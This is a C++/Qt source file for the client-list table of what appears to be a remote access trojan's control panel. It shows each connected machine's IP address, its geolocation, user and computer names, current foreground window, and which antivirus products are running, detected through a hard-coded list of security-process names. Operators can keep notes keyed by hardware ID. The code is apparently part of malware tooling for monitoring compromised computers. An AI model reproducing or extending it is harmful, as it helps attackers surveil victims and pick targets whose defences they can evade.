#include "ClientModel.h"
#include "AApch.h"
#include "fstream"
#include "nlohmann/json.hpp"
#include "qgridlayout.h"
#include "qtextedit.h"

namespace Model {
namespace Client {
ClientModel::ClientModel(QObject *parent) : QAbstractTableModel(parent) {
  network = new QNetworkAccessManager(this);

  readNote();

  connect(network, &QNetworkAccessManager::finished, this,
          &Model::Client::ClientModel::onQueryLocationCompleted);
}

ClientModel::~ClientModel() {
  saveNote();

  network->deleteLater();
}

Network::Controller *ClientModel::getController(size_t row) {
  return container[row].controller;
}

void ClientModel::addClient(Network::Controller *controller) {
  client_info info{};
  info.location = tr("Unknown");
  info.address = QString::fromStdString(controller->getRemoteAddress());
  info.cpu_model = tr("Unknown CPU");
  info.os_name = tr("Unknown System");
  info.user_name = tr("Unknown User");
  info.computer_name = tr("Unknown Computer");
  info.note = QString::fromStdString(note[controller->getHwid()]);
  info.current_window = tr("Unknown Window");
  info.anti_virus.clear();
  info.lag = 0;
  info.controller = controller;
  info.online_at = QTime::currentTime().toString();

  QUrl ip_query(
      QString("http://ip-api.com/json/%1?lang=zh-CN").arg(info.address));
  QNetworkRequest query_request(ip_query);
  QNetworkReply *reply = network->get(query_request);
  pending_query[reply] = controller;

  beginInsertRows(QModelIndex(), rowCount(), rowCount());
  container.append(std::move(info));
  endInsertRows();

  QModelIndex top_left = index(rowCount() - 1, 0);
  QModelIndex bottom_right = index(rowCount() - 1, columnCount() - 1);
  emit dataChanged(top_left, bottom_right);

  connect(controller, &Network::Controller::lag, this,
          &ClientModel::updateClientLag);
  connect(controller, &Network::Controller::recvInformation, this,
          &ClientModel::updateClientInfo);
  connect(controller, &Network::Controller::recvHeartbeat, this,
          &ClientModel::updateHeartbeat);
  connect(controller, &Network::Controller::recvGetProcess, this,
          &ClientModel::updateProcess);
}

void ClientModel::deleteClient(Network::Controller *controller) {
  auto find_ret = getRow(controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  beginRemoveRows(QModelIndex(), row, row);
  container.remove(row, 1);
  endRemoveRows();

  emitRowChanged(row);
}

void ClientModel::updateClientLag(uint32_t lag) {
  auto controller = dynamic_cast<Network::Controller *>(sender());

  auto find_ret = getRow(controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  container[row].lag = lag;

  emitRowChanged(row);
}

void ClientModel::updateClientInfo(
    std::shared_ptr<Packet::Header> header,
    std::shared_ptr<Packet::ResponseInformation> packet) {
  auto controller = dynamic_cast<Network::Controller *>(sender());

  auto find_ret = getRow(controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  container[row].cpu_model = QString::fromStdString(packet->cpu_model);
  container[row].os_name = QString::fromStdString(packet->os_name);
  container[row].user_name = QString::fromStdString(packet->user_name);
  container[row].computer_name = QString::fromStdString(packet->computer_name);

  emitRowChanged(row);
}

void ClientModel::updateHeartbeat(
    std::shared_ptr<Packet::Header> header,
    std::shared_ptr<Packet::ResponseHeartbeat> packet) {
  auto controller = dynamic_cast<Network::Controller *>(sender());

  auto find_ret = getRow(controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  container[row].current_window = QString::fromStdString(packet->focus_window);

  emitRowChanged(row);
}

void ClientModel::updateProcess(
    std::shared_ptr<Packet::Header> header,
    std::shared_ptr<Packet::ResponseGetProcess> packet) {
  auto controller = dynamic_cast<Network::Controller *>(sender());

  auto find_ret = getRow(controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  const auto &list = packet->list;
  for (const auto &p : list) {
    auto upper_name = p.name;
    for (auto &c : upper_name) {
      c = std::toupper(c);
    }

    if (upper_name == "USYSDIAG.EXE")
      container[row].anti_virus += tr("Huorong, ");
    else if (upper_name == "360TRAY.EXE")
      container[row].anti_virus += tr("360 Safety, ");
    else if (upper_name == "360SD.EXE")
      container[row].anti_virus += tr("360 Anti Virus, ");
    else if (upper_name == "MSMPENG.EXE")
      container[row].anti_virus += tr("Windows Defender, ");
    else if (upper_name == "CCSVCHST.EXE")
      container[row].anti_virus += tr("Norton, ");
    else if (upper_name == "AVP.EXE")
      container[row].anti_virus += tr("Kaspersky, ");
    else if (upper_name == "KXETRAY.EXE")
      container[row].anti_virus += tr("Kingsoft, ");
    else if (upper_name == "AVCENTER.EXE")
      container[row].anti_virus += tr("Avira, ");
    else if (upper_name == "MCSHIELD.EXE")
      container[row].anti_virus += tr("McAfee, ");
    else if (upper_name == "QQPCRTP.EXE")
      container[row].anti_virus += tr("Tencent, ");
    else if (upper_name == "VSSERY.EXE")
      container[row].anti_virus += tr("BitDefender, ");
    else if (upper_name == "BAIDUSDSVC.EXE")
      container[row].anti_virus += tr("Baidu, ");
    else if (upper_name == "SPIDERNT.EXE")
      container[row].anti_virus += tr("Dr.Web, ");
    else if (upper_name == "ASHDISP.EXE")
      container[row].anti_virus += tr("Avast, ");
    else if (upper_name == "KVMONXP.EXE")
      container[row].anti_virus += tr("Jiangmin, ");
    else if (upper_name == "EGUI.EXE")
      container[row].anti_virus += tr("NOD32, ");
  }

  emitRowChanged(row);
}

void ClientModel::onDoubleClicked(const QModelIndex &index_) {
  auto row = index_.row();
  const auto &data = container[row];

  auto *dialog = new QDialog;
  auto *edit = new QTextEdit(dialog);
  auto *layout = new QGridLayout(dialog);

  layout->addWidget(edit);
  dialog->setLayout(layout);

  dialog->setWindowTitle(QString(tr("Note for %1")).arg(data.address));
  dialog->show();

  connect(dialog, &QDialog::finished, this,
          [this, dialog, edit, layout, row]() {
            auto &data = container[row];
            auto text = edit->toPlainText();
            note[data.controller->getHwid()] = text.toStdString();

            data.note = text;
            QModelIndex top_left = index(row, 0);
            QModelIndex bottom_right = index(row, columnCount() - 1);
            emit dataChanged(top_left, bottom_right);

            dialog->deleteLater();
            edit->deleteLater();
            layout->deleteLater();
          });
}

int ClientModel::rowCount(const QModelIndex &parent) const {
  return container.size();
}

int ClientModel::columnCount(const QModelIndex &parent) const {
  // | location | ip | cpu | os name | user name | computer name | note |
  // current window | online time | lag |
  return member_count;
}

QVariant ClientModel::data(const QModelIndex &index, int role) const {
  if (!index.isValid())
    return QVariant();

  auto row = index.row();
  auto column = index.column();
  auto &info = container[row];

  switch (role) {
  case Qt::DisplayRole:
    if (column == 0)
      return info.location;
    else if (column == 1)
      return info.address;
    else if (column == 2)
      return info.cpu_model;
    else if (column == 3)
      return info.os_name;
    else if (column == 4)
      return info.user_name;
    else if (column == 5)
      return info.computer_name;
    else if (column == 6)
      return info.note;
    else if (column == 7)
      return info.current_window;
    else if (column == 8)
      return info.anti_virus;
    else if (column == 9)
      return info.online_at;
    else if (column == 10)
      return info.lag;
    break;
  case Qt::BackgroundRole:
    break;
  default:
    break;
  }

  return QVariant();
}

QVariant ClientModel::headerData(int section, Qt::Orientation orientation,
                                 int role) const {
  const static QString name_map[] = {
      tr("Location"),   tr("IP address"),    tr("CPU"),  tr("OS name"),
      tr("User name"),  tr("Computer Name"), tr("Note"), tr("Current Window"),
      tr("Anti Virus"), tr("Online Time"),   tr("Lag")};

  if (role == Qt::DisplayRole && orientation == Qt::Horizontal)
    return name_map[section];

  return QVariant();
}

void ClientModel::onQueryLocationCompleted(QNetworkReply *reply) {
  auto controller = pending_query.at(reply);

  auto find_ret = getRow(controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  pending_query.erase(reply);
  auto body = reply->readAll().toStdString();
  reply->deleteLater();

  nlohmann::json json;
  try {
    json = nlohmann::json::parse(body);
  } catch (const std::exception &) {
    return;
  }

  if (json["status"] != "success") {
    return;
  }

  auto country = QString::fromStdString(json["country"]);
  auto region = QString::fromStdString(json["regionName"]);
  auto city = QString::fromStdString(json["city"]);

  container[row].location =
      QString("%1 %2 %3").arg(country).arg(region).arg(city);

  emitRowChanged(row);
}

void ClientModel::updateClient(const client_info &info) {
  auto find_ret = getRow(info.controller);
  if (find_ret.has_value() == false) {
    spdlog::error("can not get row");
    return;
  }

  auto row = find_ret.value();

  container[row] = info;

  emitRowChanged(row);
}

void ClientModel::readNote() {
  std::ifstream note_file("client_data.json");
  if (note_file.is_open()) {
    try {
      auto json = nlohmann::json::parse(note_file);

      auto &note_node = json["note"];
      for (auto &item : note_node) {
        note[item["hwid"]] = item["content"];
      }
    } catch (const std::exception &) {
    }
  }
}

void ClientModel::saveNote() {
  std::ofstream note_file("client_data.json", std::ios::trunc);
  if (note_file.is_open()) {
    nlohmann::json json;

    auto &note_node = json["note"];
    for (auto &n : note) {
      nlohmann::json item;

      item["hwid"] = n.first;
      item["content"] = n.second;

      note_node.push_back(item);
    }

    note_file << json.dump(-1, ' ', true);
  }
}

void ClientModel::emitRowChanged(size_t row) {
  QModelIndex top_left = index(row, 0);
  QModelIndex bottom_right = index(row, columnCount() - 1);
  emit dataChanged(top_left, bottom_right);
}

std::optional<size_t> ClientModel::getRow(Network::Controller *controller) {
  for (size_t row = 0; row < container.size(); row++) {
    if (container[row].controller == controller) {
      return row;
    }
  }

  return std::nullopt;
}
} // namespace Client
} // namespace Model